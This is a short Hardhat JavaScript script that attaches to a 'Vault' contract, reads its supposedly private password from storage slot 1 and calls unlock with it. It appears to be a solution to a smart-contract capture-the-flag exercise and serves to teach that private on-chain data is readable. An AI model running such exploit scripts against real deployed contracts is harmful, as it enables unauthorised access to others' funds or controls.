const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0xf2728c6E6884248DEFb0BE40869d3BB265548723";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Contract = await ethers.getContractFactory("Vault");
  const contract = Contract.attach(instanceAddress);

  // Attack

  const password = await ethers.provider.getStorageAt(instanceAddress, 1);

  const tx = await contract.unlock(password);
  await tx.wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
